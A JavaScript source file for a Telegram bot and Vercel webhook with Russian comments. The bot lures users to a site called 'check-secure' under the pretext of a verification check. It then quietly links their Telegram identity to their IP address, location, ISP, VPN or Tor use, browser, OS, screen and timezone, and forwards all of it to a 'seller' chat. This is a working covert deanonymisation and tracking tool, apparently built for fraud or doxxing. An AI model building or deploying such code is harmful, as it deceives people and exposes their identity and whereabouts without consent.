import { Telegraf } from 'telegraf';
import geoip from 'geoip-lite';
import fetch from 'node-fetch';

const BOT_TOKEN = process.env.BOT_TOKEN;
const SELLER_CHAT_ID = process.env.SELLER_CHAT_ID;
const VPNAPI_KEY = process.env.VPNAPI_KEY;

const bot = new Telegraf(BOT_TOKEN);

// --- Хранилище Telegram пользователей ---
const users = {};

// --- Команда /start ---
bot.start((ctx) => {
  const id = ctx.from.id;
  users[id] = {
    username: ctx.from.username || '',
    firstName: ctx.from.first_name || '',
    lastName: ctx.from.last_name || ''
  };

  ctx.reply('Привет! Для продолжения проверки нажми кнопку ниже:', {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Открыть сайт для проверки', url: 'https://check-secure.vercel.app' }]
      ]
    }
  });
});

// --- Webhook handler для Vercel ---
export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  try {
    const body = await parseJson(req);

    // Telegram данные
    const tgData = users[body.telegramId] || { username: '', firstName: '', lastName: '' };

    if (!tgData.firstName) {
      return res.status(400).json({ error: 'Telegram данные не найдены' });
    }

    // --- IP и Geo ---
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const geo = geoip.lookup(ip);

    // --- VPN/ISP через VPNAPI ---
    let isp = 'неизвестно';
    let vpnWarning = '';
    try {
      const vpnResp = await fetch(`https://vpnapi.io/api/${ip}?key=${VPNAPI_KEY}`);
      const vpnData = await vpnResp.json();

      if (vpnData.security) {
        isp = vpnData.network?.autonomous_system_organization || isp;
        if (vpnData.security.vpn || vpnData.security.proxy || vpnData.security.tor) {
          vpnWarning = '⚠ Пользователь использует VPN/Proxy/Tor';
        }
      }
    } catch (e) {
      console.error('VPNAPI error:', e);
    }

    // --- Формируем сообщение ---
    const message = `
🟢 *Новый пользователь*

👤 Telegram: ${tgData.firstName} ${tgData.lastName} (@${tgData.username})
🌍 IP: ${ip}
📌 Страна: ${geo?.country || 'неизвестно'}
🏙 Регион: ${geo?.region || 'неизвестно'}
🏢 Провайдер: ${isp}
${vpnWarning}

🖥 Браузер: ${body.browser || 'неизвестно'}
💻 ОС: ${body.os || 'неизвестно'}
🌐 Язык: ${body.language || 'неизвестно'}
📺 Экран: ${body.screen || 'неизвестно'}
⏰ Таймзона: ${body.timezone || 'неизвестно'}
`;

    await bot.telegram.sendMessage(SELLER_CHAT_ID, message, { parse_mode: 'Markdown' });

    res.status(200).json({ status: 'ok' });

  } catch (err) {
    console.error(err);
    res.status(500).send('Error');
  }
}

// --- JSON парсер ---
async function parseJson(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => resolve(JSON.parse(body)));
    req.on('error', reject);
  });
}
